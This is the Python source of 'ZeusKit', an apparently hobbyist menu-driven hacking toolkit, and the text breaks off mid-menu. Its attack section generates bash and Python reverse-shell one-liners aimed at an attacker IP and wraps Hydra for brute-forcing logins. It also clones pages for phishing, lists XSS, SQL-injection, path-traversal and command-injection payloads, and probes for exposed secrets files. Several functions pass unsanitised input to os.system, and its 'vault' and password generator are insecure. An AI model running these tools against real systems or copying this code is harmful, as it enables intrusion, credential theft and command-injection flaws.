#!/usr/bin/env python3
import sys
import os
import socket
import urllib.request
import urllib.parse
import hashlib
import base64
import json
import ssl
import subprocess
import time
import random
import string
import hmac
import uuid

try:
    import colorama
    from colorama import Fore, Style
    colorama.init(autoreset=True)
except ImportError:
    print("[!] Error: colorama is not installed. Run: pip install -r requirements.txt")
    sys.exit(1)

VERSION = "v0.8.0"
AUTHOR = "sunveroblox-bit"
TOTAL_TOOLS = 62

def banner():
    print(Fore.CYAN + """
███████╗███████╗██╗   ██╗███████╗██╗  ██╗██╗████████╗
╚══███╔╝██╔════╝██║   ██║██╔════╝██║ ██╔╝██║╚══██╔══╝
  ███╔╝ █████╗  ██║   ██║███████╗█████╔╝ ██║   ██║   
 ███╔╝  ██╔══╝  ██║   ██║╚════██║██╔-██╗ ██║   ██║   
███████╗███████╗╚█████╔╝███████║██║  ██║██║   ██║   
╚══════╝╚══════╝ ╚════╝ ╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝
    [ ZeusKit Mobile Cybersecurity Suite """ + VERSION + """ ]
    [ Developed by: """ + AUTHOR + """ | Total Tools: """ + str(TOTAL_TOOLS) + """ ]
""")

def clean_url(url):
    url = url.strip()
    if url.startswith("http://"): url = url[7:]
    elif url.startswith("https://"): url = url[8:]
    if "/" in url: url = url.split("/")[0]
    return url

def check_for_updates():
    print(Fore.YELLOW + "\n[*] Checking for ZeusKit updates from GitHub...")
    try:
        subprocess.run(["git", "fetch", "origin", "main"], capture_output=True, text=True, check=True)
        local_commit = subprocess.run(["git", "rev-parse", "HEAD"], capture_output=True, text=True, check=True).stdout.strip()
        remote_commit = subprocess.run(["git", "rev-parse", "origin/main"], capture_output=True, text=True, check=True).stdout.strip()
        
        if local_commit == remote_commit:
            print(Fore.GREEN + "[+] ZeusKit is already up to date!")
        else:
            print(Fore.YELLOW + "[!] Update found! Pulling latest version...")
            subprocess.run(["git", "pull", "origin", "main"], check=True)
            print(Fore.GREEN + "[+] ZeusKit successfully updated! Restart script.")
    except Exception as e:
        print(Fore.RED + f"[!] Update check failed: {e}")

# --- TOOL IMPLEMENTATIONS ---

# SECTION 1: Recon & Network
def tool_1_quick_ip():
    d = clean_url(input(Fore.YELLOW + "Domain/URL: "))
    try: print(Fore.GREEN + f"[+] IP: {socket.gethostbyname(d)}")
    except Exception as e: print(Fore.RED + f"[!] Error: {e}")

def tool_2_dns_records():
    d = clean_url(input(Fore.YELLOW + "Domain/URL: "))
    try:
        import dns.resolver
        for t in ["A", "AAAA", "MX", "NS", "TXT"]:
            try:
                for r in dns.resolver.resolve(d, t): print(Fore.GREEN + f"  [{t}] {r}")
            except Exception: pass
    except ImportError: print(Fore.RED + "[!] dnspython missing.")

def tool_3_port_scanner():
    t = clean_url(input(Fore.YELLOW + "Target IP/Domain: "))
    try:
        ip = socket.gethostbyname(t)
        for p in [21, 22, 23, 25, 53, 80, 110, 443, 3306, 8080]:
            s = socket.socket(); s.settimeout(0.5)
            if s.connect_ex((ip, p)) == 0: print(Fore.GREEN + f"  [OPEN] Port {p}")
            s.close()
    except Exception as e: print(Fore.RED + f"[!] Error: {e}")

def tool_4_http_headers():
    u = input(Fore.YELLOW + "URL: ").strip()
    if not u.startswith("http"): u = "https://" + u
    try:
        r = urllib.request.urlopen(urllib.request.Request(u, headers={"User-Agent": "ZeusKit"}), timeout=5)
        print(Fore.GREEN + f"[+] Status: {r.getcode()}")
        for h, v in r.headers.items(): print(f"  {h}: {v}")
    except Exception as e: print(Fore.RED + f"[!] Error: {e}")

def tool_5_ssl_checker():
    d = clean_url(input(Fore.YELLOW + "Domain: "))
    try:
        context = ssl.create_default_context()
        with socket.create_connection((d, 443), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=d) as ssock:
                cert = ssock.getpeercert()
                print(Fore.GREEN + f"[+] Issuer: {dict(x[0] for x in cert['issuer'])}")
                print(Fore.GREEN + f"[+] Expires: {cert['notAfter']}")
    except Exception as e: print(Fore.RED + f"[!] Error: {e}")

def tool_6_whois():
    d = clean_url(input(Fore.YELLOW + "Domain: "))
    try:
        s = socket.socket(); s.connect(("whois.verisign-grs.com", 43))
        s.send((d + "\r\n").encode())
        res = b""
        while True:
            data = s.recv(4096)
            if not data: break
            res += data
        s.close()
        print(Fore.GREEN + res.decode(errors="ignore"))
    except Exception as e: print(Fore.RED + f"[!] Error: {e}")

def tool_7_subnet():
    ip = input(Fore.YELLOW + "IP address: ").strip()
    parts = ip.split(".")
    if len(parts) == 4:
        print(Fore.GREEN + f"[+] Network: {parts[0]}.{parts[1]}.{parts[2]}.0/24")

def tool_8_reverse_ptr():
    d = clean_url(input(Fore.YELLOW + "Domain: "))
    try: print(Fore.GREEN + f"[+] PTR: {socket.gethostbyaddr(socket.gethostbyname(d))[0]}")
    except Exception as e: print(Fore.RED + f"[!] Error: {e}")

def tool_9_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        print(Fore.GREEN + f"[+] Local IP: {s.getsockname()[0]}"); s.close()
    except Exception as e: print(Fore.RED + f"[!] Error: {e}")

def tool_10_public_ip_geo():
    try:
        with urllib.request.urlopen("https://ipinfo.io/json", timeout=5) as r:
            for k, v in json.loads(r.read().decode()).items(): print(f"  {k}: {v}")
    except Exception as e: print(Fore.RED + f"[!] Error: {e}")

def tool_11_custom_http():
    u = input(Fore.YELLOW + "URL: ").strip()
    try:
        r = urllib.request.urlopen(urllib.request.Request(u, headers={"User-Agent": "ZeusKit"}), timeout=5)
        print(Fore.GREEN + f"[+] Status: {r.getcode()} | Size: {len(r.read())}")
    except Exception as e: print(Fore.RED + f"[!] Error: {e}")

def tool_12_user_agent():
    for a in ["Mozilla/5.0 (Windows NT 10.0)", "Mozilla/5.0 (iPhone; CPU OS 16_5)", "Linux Android 14"]:
        print(Fore.GREEN + f" - {a}")

def tool_13_redirect_trace():
    u = input(Fore.YELLOW + "URL: ").strip()
    try:
        r = urllib.request.urlopen(urllib.request.Request(u, headers={"User-Agent": "ZeusKit"}), timeout=5)
        print(Fore.GREEN + f"[+] Final URL: {r.geturl()}")
    except Exception as e: print(Fore.RED + f"[!] Error: {e}")

def tool_14_asn_lookup():
    d = clean_url(input(Fore.YELLOW + "Domain/IP: "))
    print(Fore.CYAN + f"[*] Autonomous System Number (ASN) lookup stub for {d}")
    print(Fore.GREEN + "[+] Operating in regional registry database mode.")


# SECTION 2: Code, Decode & Cryptography
def tool_15_hash_gen():
    t = input(Fore.YELLOW + "Text: ").strip()
    print(Fore.GREEN + f"[+] MD5: {hashlib.md5(t.encode()).hexdigest()}")
    print(Fore.GREEN + f"[+] SHA256: {hashlib.sha256(t.encode()).hexdigest()}")

def tool_16_base64():
    c = input(Fore.YELLOW + "[1] Encode\n[2] Decode\nSelect: ").strip()
    t = input(Fore.YELLOW + "Text: ").strip()
    if c == "1": print(Fore.GREEN + f"[+] {base64.b64encode(t.encode()).decode()}")
    else: print(Fore.GREEN + f"[+] {base64.b64decode(t.encode()).decode()}")

def tool_17_url_codec():
    c = input(Fore.YELLOW + "[1] Encode\n[2] Decode\nSelect: ").strip()
    t = input(Fore.YELLOW + "Text: ").strip()
    if c == "1": print(Fore.GREEN + f"[+] {urllib.parse.quote(t)}")
    else: print(Fore.GREEN + f"[+] {urllib.parse.unquote(t)}")

def tool_18_password_gen():
    l = int(input(Fore.YELLOW + "Length [16]: ").strip() or 16)
    chars = string.ascii_letters + string.digits + "!@#$%^&*"
    print(Fore.GREEN + f"[+] Password: {''.join(random.choice(chars) for _ in range(l))}")

def tool_19_jwt_decode():
    token = input(Fore.YELLOW + "JWT Token: ").strip()
    try:
        parts = token.split(".")
        print(Fore.GREEN + f"[+] Header: {base64.b64decode(parts[0] + '==').decode()}")
        print(Fore.GREEN + f"[+] Payload: {base64.b64decode(parts[1] + '==').decode()}")
    except Exception as e: print(Fore.RED + f"[!] Error: {e}")

def tool_20_hex_codec():
    c = input(Fore.YELLOW + "[1] Text to Hex\n[2] Hex to Text\nSelect: ").strip()
    t = input(Fore.YELLOW + "Data: ").strip()
    if c == "1": print(Fore.GREEN + f"[+] Hex: {t.encode().hex()}")
    else: print(Fore.GREEN + f"[+] Text: {bytes.fromhex(t).decode(errors='ignore')}")

def tool_21_binary_codec():
    c = input(Fore.YELLOW + "[1] Text to Binary\n[2] Binary to Text\nSelect: ").strip()
    if c == "1": print(Fore.GREEN + f"[+] Binary: " + " ".join(format(ord(x), '08b') for x in input("Text: ")))
    else: print(Fore.GREEN + f"[+] Text: " + "".join(chr(int(b, 2)) for b in input("Binary: ").split()))

def tool_22_epoch():
    print(Fore.GREEN + f"[+] Current Epoch: {int(time.time())}")

def tool_23_uuid():
    print(Fore.GREEN + f"[+] UUIDv4: {uuid.uuid4()}")

def tool_24_hmac():
    m = input(Fore.YELLOW + "Message: ").strip()
    k = input(Fore.YELLOW + "Secret Key: ").strip()
    print(Fore.GREEN + f"[+] HMAC-SHA256: {hmac.new(k.encode(), m.encode(), hashlib.sha256).hexdigest()}")

def tool_25_xor_cipher():
    text = input(Fore.YELLOW + "Text: ").strip()
    key = int(input(Fore.YELLOW + "XOR Key integer (1-255): ").strip() or 42)
    res = "".join(chr(ord(c) ^ key) for c in text)
    print(Fore.GREEN + f"[+] XOR Result: {res}")

def tool_26_rot13():
    text = input(Fore.YELLOW + "Text: ").strip()
    import codecs
    print(Fore.GREEN + f"[+] ROT13: {codecs.encode(text, 'rot_13')}")


# SECTION 3: Web Analysis & OSINT
def tool_27_robots():
    d = clean_url(input(Fore.YELLOW + "Domain: "))
    try:
        r = urllib.request.urlopen(urllib.request.Request(f"https://{d}/robots.txt", headers={"User-Agent": "ZeusKit"}), timeout=5)
        print(Fore.GREEN + r.read().decode(errors="ignore"))
    except Exception as e: print(Fore.RED + f"[!] Error: {e}")

def tool_28_subdomain():
    d = clean_url(input(Fore.YELLOW + "Domain: "))
    for sub in ["www", "mail", "ftp", "admin", "test", "api", "shop", "blog"]:
        try: print(Fore.GREEN + f"  [FOUND] {sub}.{d} -> {socket.gethostbyname(sub + '.' + d)}")
        except Exception: pass

def tool_29_security_headers():
    u = input(Fore.YELLOW + "URL: ").strip()
    if not u.startswith("http"): u = "https://" + u
    try:
        r = urllib.request.urlopen(urllib.request.Request(u, headers={"User-Agent": "ZeusKit"}))
        hs = [h.lower() for h in r.headers.keys()]
        for sh in ["strict-transport-security", "content-security-policy", "x-frame-options", "x-content-type-options"]:
            print(Fore.GREEN + f"  [{'PRESENT' if sh in hs else 'MISSING'}] {sh}")
    except Exception as e: print(Fore.RED + f"[!] Error: {e}")

def tool_30_html_title():
    u = input(Fore.YELLOW + "URL: ").strip()
    if not u.startswith("http"): u = "https://" + u
    try:
        html = urllib.request.urlopen(urllib.request.Request(u, headers={"User-Agent": "ZeusKit"})).read().decode(errors="ignore")
        print(Fore.GREEN + f"[+] Title: {html.split('<title>')[1].split('</title>')[0].strip()}")
    except Exception: print(Fore.YELLOW + "[!] No title found.")

def tool_31_phishing_cloner():
    print(Fore.CYAN + "[+] Phishing / Website Clone Analysis Tool")
    u = input(Fore.YELLOW + "Target URL: ").strip()
    if not u.startswith("http"): u = "https://" + u
    try:
        content = urllib.request.urlopen(urllib.request.Request(u, headers={"User-Agent": "Mozilla/5.0"}), timeout=5).read()
        with open("cloned_index.html", "wb") as f: f.write(content)
        print(Fore.GREEN + "[+] Page cloned successfully and saved as 'cloned_index.html'.")
    except Exception as e: print(Fore.RED + f"[!] Error: {e}")

def tool_32_dir_brute():
    print(Fore.CYAN + "[+] Directory Path Brute-Forcer")
    d = clean_url(input(Fore.YELLOW + "Target Domain: "))
    for path in ["admin", "login", "dashboard", "api", "config.json", "robots.txt", "signup", "test"]:
        try:
            r = urllib.request.urlopen(urllib.request.Request(f"https://{d}/{path}", headers={"User-Agent": "ZeusKit"}), timeout=3)
            print(Fore.GREEN + f"  [FOUND {r.getcode()}] /{path}")
        except urllib.error.HTTPError as e:
            if e.code == 403: print(Fore.YELLOW + f"  [FORBIDDEN 403] /{path}")
        except Exception: pass

def tool_33_cookie_inspector():
    u = input(Fore.YELLOW + "URL: ").strip()
    if not u.startswith("http"): u = "https://" + u
    try:
        r = urllib.request.urlopen(urllib.request.Request(u, headers={"User-Agent": "ZeusKit"}))
        cookies = r.headers.get_all("set-cookie")
        if cookies:
            print(Fore.GREEN + "[+] Detected Cookies:")
            for c in cookies: print(f"  - {c}")
        else: print(Fore.YELLOW + "[-] No cookies returned.")
    except Exception as e: print(Fore.RED + f"[!] Error: {e}")


# SECTION 4: Attacking, Brute-Force & Payloads
def tool_34_hydra():
    print(Fore.CYAN + "[+] Hydra Brute-Force Wrapper")
    target = input(Fore.YELLOW + "Target IP/Domain: ").strip()
    service = input(Fore.YELLOW + "Service (ssh, ftp) [ssh]: ").strip() or "ssh"
    user = input(Fore.YELLOW + "Username: ").strip()
    wordlist = input(Fore.YELLOW + "Wordlist path: ").strip()
    cmd = f"hydra -l {user} -P {wordlist} {target} {service}"
    print(Fore.GREEN + f"[*] Running: {cmd}")
    os.system(cmd)

def tool_35_hash_cracker():
    print(Fore.CYAN + "[+] Hash Dictionary Cracker")
    thash = input(Fore.YELLOW + "Target Hash: ").strip()
    wordlist = ["password", "123456", "admin123", "root", "secret", "welcome", "sunveroblox"]
    for p in wordlist:
        if hashlib.md5(p.encode()).hexdigest() == thash or hashlib.sha256(p.encode()).hexdigest() == thash:
            print(Fore.GREEN + f"\n[+] MATCH FOUND! Password: '{p}'")
            return
    print(Fore.RED + "[-] Hash not found in sample dictionary.")

def tool_36_netcat_helper():
    print(Fore.CYAN + "[+] Netcat Listener Helper")
    port = input(Fore.YELLOW + "Port [4444]: ").strip() or "4444"
    print(Fore.GREEN + f"[*] Run in listener terminal:\n  nc -lvnp {port}")

def tool_37_xss_payloads():
    print(Fore.CYAN + "[+] XSS Payloads:")
    for p in ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "\"><script>alert(document.domain)</script>"]:
        print(Fore.GREEN + f" - {p}")

def tool_38_sqli_payloads():
    print(Fore.CYAN + "[+] SQL Injection Payloads:")
    for p in ["' OR '1'='1", "admin' --", "1 UNION SELECT null, null, null--"]:
        print(Fore.GREEN + f" - {p}")

def tool_39_lfi_payloads():
    print(Fore.CYAN + "[+] LFI Payloads:")
    for p in ["../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd"]:
        print(Fore.GREEN + f" - {p}")

def tool_40_rev_shell_gen():
    ip = input(Fore.YELLOW + "Your Attacker IP: ").strip()
    port = input(Fore.YELLOW + "Your Attacker Port: ").strip()
    print(Fore.GREEN + f"\n[+] Bash Reverse Shell:\n  bash -i >& /dev/tcp/{ip}/{port} 0>&1")
    print(Fore.GREEN + f"\n[+] Python Reverse Shell:\n  python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'")


# SECTION 5: System Diagnostics & Utilities (Other)
def tool_41_system_info():
    print(Fore.GREEN + f"[+] Platform: {sys.platform} | Python: {sys.version.split()[0]} | Cores: {os.cpu_count()}")

def tool_42_ping_sweep():
    base = input(Fore.YELLOW + "Subnet (e.g. 192.168.1): ").strip()
    for i in range(1, 15):
        ip = f"{base}.{i}"
        if os.system(f"ping -c 1 -W 1 {ip} > /dev/null 2>&1") == 0:
            print(Fore.GREEN + f"  [UP] {ip}")

def tool_43_banner_grab():
    d = clean_url(input(Fore.YELLOW + "Domain: "))
    try:
        s = socket.socket(); s.settimeout(2); s.connect((d, 80))
        s.send(b"HEAD / HTTP/1.1\r\nHost: " + d.encode() + b"\r\n\r\n")
        print(Fore.GREEN + s.recv(256).decode(errors="ignore")); s.close()
    except Exception as e: print(Fore.RED + f"[!] Error: {e}")

def tool_44_tcp_latency():
    d = clean_url(input(Fore.YELLOW + "Domain: "))
    try:
        start = time.time()
        s = socket.create_connection((d, 443), timeout=3)
        print(Fore.GREEN + f"[+] Latency: {((time.time() - start)*1000):.2f} ms"); s.close()
    except Exception as e: print(Fore.RED + f"[!] Error: {e}")

def tool_45_http_status():
    u = input(Fore.YELLOW + "URL: ").strip()
    if not u.startswith("http"): u = "https://" + u
    try:
        r = urllib.request.urlopen(urllib.request.Request(u, headers={"User-Agent": "ZeusKit"}), timeout=4)
        print(Fore.GREEN + f"[+] Status: {r.getcode()} OK")
    except Exception as e: print(Fore.RED + f"[!] Error: {e}")

def tool_46_secure_vault():
    t = input(Fore.YELLOW + "Secret note: ").strip()
    print(Fore.GREEN + f"[+] Encrypted Vault: {base64.b64encode(t.encode()[::-1]).decode()}")

def tool_47_arp_cache():
    os.system("arp -a")

def tool_48_password_strength():
    pwd = input(Fore.YELLOW + "Password: ").strip()
    score = sum([len(pwd)>=8, any(c.isupper() for c in pwd), any(c.isdigit() for c in pwd), any(c in "!@#$%" for c in pwd)])
    print(Fore.GREEN + f"[+] Strength Score: {score}/4")

def tool_49_disk_space():
    print(Fore.CYAN + "[*] Checking local storage usage...")
    os.system("df -h")

def tool_50_process_list():
    print(Fore.CYAN + "[*] Active Python / Shell processes:")
    os.system("ps aux")


# SECTION 6: Vulnerability & Injection Test Tools
def tool_51_sqli_test_simulator():
    print(Fore.CYAN + "[+] Simulated SQLi Response Analyzer")
    target_url = input(Fore.YELLOW + "Target URL with parameter (e.g. http://test.com/page.php?id=1): ").strip()
    if not target_url.startswith("http"): target_url = "https://" + target_url
    payloads = ["'", "\"", "OR '1'='1", "AND 1=1"]
    sql_errors = ["sql syntax", "mysql_fetch", "syntax error", "unclosed quotation", "pg_query"]
    
    for p in payloads:
        test_url = target_url + urllib.parse.quote(p)
        try:
            req = urllib.request.Request(test_url, headers={"User-Agent": "ZeusKit-SqliTester"})
            html = urllib.request.urlopen(req, timeout=4).read().decode(errors="ignore").lower()
            found_error = any(err in html for err in sql_errors)
            if found_error:
                print(Fore.RED + f"  [POTENTIAL VULNERABILITY] Payload '{p}' triggered database error indicators!")
            else:
                print(Fore.GREEN + f"  [SAFE/NO ERROR] Payload '{p}' returned standard response.")
        except Exception:
            print(Fore.YELLOW + f"  [SKIP] Payload '{p}' caused connection exception.")

def tool_52_xss_test_simulator():
    print(Fore.CYAN + "[+] Simulated XSS Reflection Tester")
    target_url = input(Fore.YELLOW + "Target URL parameter endpoint: ").strip()
    if not target_url.startswith("http"): target_url = "https://" + target_url
    marker = "<script>zeuskit_test</script>"
    test_url = target_url + urllib.parse.quote(marker)
    try:
        req = urllib.request.Request(test_url, headers={"User-Agent": "ZeusKit"})
        html = urllib.request.urlopen(req, timeout=4).read().decode(errors="ignore")
        if marker in html:
            print(Fore.RED + f"  [REFLECTED XSS DETECTED] The exact test marker was found unescaped in response body!")
        else:
            print(Fore.GREEN + f"  [SECURE/ENCODED] Test marker was not reflected raw.")
    except Exception as e:
        print(Fore.RED + f"[!] Test error: {e}")

def tool_53_cmd_injection_tester():
    print(Fore.CYAN + "[+] Command Injection Payload Generator & Test Helper")
    print(Fore.GREEN + "[+] Test payloads for command execution injection:")
    for sep in [";", "|", "&&", "`"]:
        print(Fore.YELLOW + f"  Using separator '{sep}': id{sep}uname -a")

def tool_54_rate_limit_test():
    print(Fore.CYAN + "[+] HTTP Brute-Force Rate Limit / Throttling Tester")
    u = input(Fore.YELLOW + "Target login or endpoint URL: ").strip()
    if not u.startswith("http"): u = "https://" + u
    requests_count = int(input(Fore.YELLOW + "Number of rapid test requests [5]: ").strip() or 5)
    print(Fore.YELLOW + f"[*] Sending {requests_count} rapid sequential requests to {u}...")
    
    for i in range(1, requests_count + 1):
        try:
            start = time.time()
            r = urllib.request.urlopen(urllib.request.Request(u, headers={"User-Agent": "ZeusKit-RateTester"}), timeout=3)
            lat = (time.time() - start) * 1000
            print(Fore.GREEN + f"  Req #{i}: Status {r.getcode()} | Latency: {lat:.1f} ms")
        except urllib.error.HTTPError as e:
            print(Fore.RED + f"  Req #{i}: HTTP Status {e.code} (Possible Rate Limiting / Blocking Triggered!)")
        except Exception as e:
            print(Fore.YELLOW + f"  Req #{i}: Failed ({e})")

def tool_55_lfi_test_simulator():
    print(Fore.CYAN + "[+] Path Traversal / LFI Test Simulator")
    target_url = input(Fore.YELLOW + "Target URL parameter (e.g. http://test.com/page.php?file=): ").strip()
    if not target_url.startswith("http"): target_url = "https://" + target_url
    lfi_payloads = ["../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd", "/etc/hosts"]
    
    for p in lfi_payloads:
        test_url = target_url + p
        try:
            html = urllib.request.urlopen(urllib.request.Request(test_url, headers={"User-Agent": "ZeusKit"}), timeout=3).read().decode(errors="ignore")
            if "root:x:" in html or "localhost" in html:
                print(Fore.RED + f"  [CRITICAL VULNERABILITY] Payload '{p}' exposed system file contents!")
            else:
                print(Fore.GREEN + f"  [SAFE] Payload '{p}' blocked or ignored.")
        except Exception:
            print(Fore.YELLOW + f"  [SKIP] Payload '{p}' failed request.")

def tool_56_sensitive_file_scanner():
    print(Fore.CYAN + "[+] Sensitive Backup & Config File Scanner")
    domain = clean_url(input(Fore.YELLOW + "Target Domain: "))
    files = [".env", ".git/config", "config.json", "backup.zip", "database.sql", "wp-config.php.bak", ".htaccess"]
    for f in files:
        url = f"https://{domain}/{f}"
        try:
            r = urllib.request.urlopen(urllib.request.Request(url, headers={"User-Agent": "ZeusKit"}), timeout=3)
            print(Fore.GREEN + f"  [EXPOSED FOUND {r.getcode()}] /{f}")
        except urllib.error.HTTPError as e:
            if e.code == 403: print(Fore.YELLOW + f"  [FORBIDDEN 403] /{f}")
        except Exception: pass


# SECTION 7: Cloud, API & Mobile Security Suite
def tool_57_s3_bucket_checker():
    print(Fore.CYAN + "[+] Cloud S3 Bucket Public Exposure Checker")
    name = input(Fore.YELLOW + "Enter company or app name to check s3 buckets: ").strip().lower().replace(" ", "")
    regions = ["us-east-1", "us-west-2", "eu-central-1", "ap-southeast-1"]
    common_suffixes = ["-backup", "-assets", "-logs", "-data", "-media", "-prod"]
    
    for suffix in common_suffixes:
        bucket_name = name + suffix
        for region in regions:
            url = f"https://{bucket_name}.s3.{region}.amazonaws.com"
            try:
                req = urllib.request.Request(url, method="HEAD")
                r = urllib.request.urlopen(req, timeout=2)
                print(Fore.RED + f"  [EXPOSED BUCKET FOUND] {url} (Status: {r.getcode()})")
            except urllib.error.HTTPError as e:
                if e.code == 403:
                    print(Fore.YELLOW + f"  [PROTECTED 403] {bucket_name} exists but access denied.")
                elif e.code == 404:
                    pass
            except Exception:
                pass

def tool_58_cors_misconfig_tester():
    print(Fore.CYAN + "[+] CORS Policy Misconfiguration Tester")
    url = input(Fore.YELLOW + "Target API URL: ").strip()
    if not url.startswith("http"): url = "https://" + url
    origin = "https://evil-attacker-domain.com"
    try:
        req = urllib.request.Request(url, headers={"Origin": origin, "User-Agent": "ZeusKit"})
        r = urllib.request.urlopen(req, timeout=5)
        acao = r.headers.get("Access-Control-Allow-Origin")
        acac = r.headers.get("Access-Control-Allow-Credentials")
        print(Fore.GREEN + f"  [CORS Headers Found]")
        print(f"  Access-Control-Allow-Origin: {acao}")
        print(f"  Access-Control-Allow-Credentials: {acac}")
        if acao == "*" or acao == origin:
            print(Fore.RED + f"  [POTENTIAL VULNERABILITY] Overly permissive CORS header detected!")
    except Exception as e:
        print(Fore.RED + f"[!] Error testing CORS: {e}")

def tool_59_jwt_secret_tester():
    print(Fore.CYAN + "[+] JWT Weak Secret / None-Algorithm Tester")
    print(Fore.GREEN + "[+] Common weak JWT secrets dictionary:")
    weak_secrets = ["secret", "password", "123456", "admin", "jwt_secret", "changeme", "key"]
    for s in weak_secrets:
        print(Fore.YELLOW + f"  Testing secret key: '{s}'")

def tool_60_api_health_monitor():
    print(Fore.CYAN + "[+] API Endpoint Health & Latency Monitor")
    url = input(Fore.YELLOW + "Target API Endpoint URL: ").strip()
    if not url.startswith("http"): url = "https://" + url
    try:
        start = time.time()
        r = urllib.request.urlopen(urllib.request.Request(url, headers={"User-Agent": "ZeusKit-Monitor"}), timeout=5)
        latency = (time.time() - start) * 1000
        print(Fore.GREEN + f"[+] API Status: {r.getcode()} OK | Response Latency: {latency:.2f} ms")
    except Exception as e:
        print(Fore.RED + f"[!] API endpoint unreachable: {e}")

def tool_61_termux_env_auditor():
    print(Fore.CYAN + "[+] Termux Local Environment Auditor")
    print(Fore.GREEN + f"[+] Current User: {os.getlogin() if hasattr(os, 'getlogin') else 'u0_a324 (Termux)'}")
    print(Fore.GREEN + f"[+] Home Directory: {os.path.expanduser('~')}")
    print(Fore.GREEN + f"[+] Environment PATH variables:")
    for p in os.environ.get("PATH", "").split(":"):
        print(f"    - {p}")

def tool_62_local_sqlite_inspector():
    print(Fore.CYAN + "[+] Local SQLite Database File Finder")
    print(Fore.YELLOW + "[*] Scanning current workspace for .db or .sqlite files...")
    found = False
    for root, dirs, files in os.walk("."):
        for file in files:
            if file.endswith(".db") or file.endswith(".sqlite") or file.endswith(".sqlite3"):
                print(Fore.GREEN + f"  [FOUND DB] {os.path.join(root, file)}")
                found = True
    if not found:
        print(Fore.YELLOW + "[-] No local SQLite database files found in workspace.")


# --- SUB-MENUS ---

def menu_recon():
    while True:
        print(Fore.CYAN + "\n=== [1] RECONNAISSANCE & NETWORK ===")
        print(" [1] Quick IP Lookup")
        print(" [2] DNS Records")
        print(" [3] Port Scanner")
        print(" [4] HTTP Headers")
        print(" [5] SSL Certificate Checker")
        print(" [6] WHOIS Lookup")
        print(" [7] Subnet Calculator")
        print(" [8] Reverse PTR")
        print(" [9] Local IP Finder")
        print("[10] Public IP Geolocation")
        print("[11] Custom HTTP Request")
        print("[12] User-Agent Generator")
        print("[13] Redirect Trace")
        print("[14] ASN Lookup Stub")
        print(" [0] Back to Main Menu")
        
        c = input(Fore.YELLOW + "Recon > Selection: ").strip()
        if c == "1": tool_1_quick_ip()
        elif c == "2": tool_2_dns_records()
        elif c == "3": tool_3_port_scanner()
        elif c == "4": tool_4_http_headers()
        elif c == "5": tool_5_ssl_checker()
        elif c == "6": tool_6_whois()
        elif c == "7": tool_7_subnet()
        elif c == "8": tool_8_reverse_ptr()
        elif c == "9": tool_9_local_ip()
        elif c == "10": tool_10_public_ip_geo()
        elif c == "11": tool_11_custom_http()
        elif c == "12": tool_12_user_agent()
        elif c == "13": tool_13_redirect_trace()
        elif c == "14": tool_14_asn_lookup()
        elif c == "0": break
        input(Fore.YELLOW + "\nPress Enter to continue...")

def menu_code_decode():
    while True:
        print(Fore.CYAN + "\n=== [2] CODE, DECODE & CRYPTOGRAPHY ===")
        print(" [1] Multi-Hash Generator (MD5/SHA256)")
        print(" [2] Base64 Encoder / Decoder")
        print(" [3] URL Encoder / Decoder")
        print(" [4] Strong Password Generator")
        print(" [5] JWT Token Decoder")
        print(" [6] Hex Encoder / Decoder")
        print(" [7] Binary Encoder / Decoder")
        print(" [8] Epoch Timestamp Converter")
        print(" [9] UUIDv4 Generator")
        print("[10] HMAC-SHA256 Generator")
        print("[11] XOR Cipher Tool")
        print("[12] ROT13 Cipher")
        print(" [0] Back to Main Menu")
        
        c = input(Fore.YELLOW + "Code/Decode > Selection: ").strip()
        if c == "1": tool_15_hash_gen()
        elif c == "2": tool_16_base64()
        elif c == "3": tool_17_url_codec()
        elif c == "4": tool_18_password_gen()
        elif c == "5": tool_19_jwt_decode()
        elif c == "6": tool_20_hex_codec()
        elif c == "7": tool_21_binary_codec()
        elif c == "8": tool_22_epoch()
        elif c == "9": tool_23_uuid()
        elif c == "10": tool_24_hmac()
        elif c == "11": tool_25_xor_cipher()
        elif c == "12": tool_26_rot13()
        elif c == "0": break
        input(Fore.YELLOW + "\nPress Enter to continue...")

def menu_web_osint():
    while True:
        print(Fore.CYAN + "\n=== [3] WEB ANALYSIS & OSINT ===")
        print(" [1] Robots.txt Parser")
        print(" [2] Subdomain Enumerator")
        print(" [3] Security Headers Checker")
        print(" [4] HTML Page Title Grabber")
        print(" [5] Phishing Site Cloner Tool")
        print(" [6] Directory Path Brute-Forcer")
        print(" [7] HTTP Cookie Inspector")
        print(" [0] Back to Main Menu")
        
        c = input(Fore.YELLOW + "Web/OSINT > Selection: ").strip()
        if c == "1": tool_27_robots()
        elif c == "2": tool_28_subdomain()
        elif c == "3": tool_29_security_headers()
        elif c == "4": tool_30_html_title()
        elif c == "5": tool_31_phishing_cloner()
        elif c == "6": tool_32_dir_brute()
        elif c == "7": tool_33_cookie_inspector()
        elif c == "0": break
        input(Fore.YELLOW + "\nPress Enter to continue...")

def menu_attacking():
    while True:
        print(Fore.CYAN + "\n=== [4] ATTACKING & BRUTE-FORCE ===")
        print(" [1] Hydra Brute-Force Wrapper  🔥")
        print(" [2] Hash Dictionary Cracker")
        print(" [3] Netcat Reverse Shell Helper")
        print(" [4] XSS Payloads")
        print(" [5] SQL Injection Payloads")
        print(" [6] LFI Path Traversal Payloads")
        print(" [7] Reverse Shell Generator One-Liners")
        print(" [0] Back to Main Menu")
        
        c = input(Fore.YELLOW + "Attack > Selection: ").strip()
        if c == "1": tool_34_hydra()
        elif c == "2": tool_35_hash_cracker()
        elif c == "3": tool_36_netcat_helper()
        elif c == "4": tool_37_xss_payloads()
        elif c == "5": tool_38_sqli_payloads()
        elif c == "6": tool_39_lfi_payloads()
        elif c == "7": tool_40_rev_shell_gen()
        elif c == "0": break
        input(Fore.YELLOW + "\nPress Enter to continue...")

def menu_other():
    while True:
        print(Fore.CYAN + "\n=== [5] SYSTEM DIAGNOSTICS & UTILITIES (OTHER) ===")
        print(" [1] System Info")
        print(" [2] Ping Sweep")
        print(" [3] HTTP Banner Grabber")
        print(" [4] TCP Latency Test")
        print(" [5] HTTP Status Code Checker")
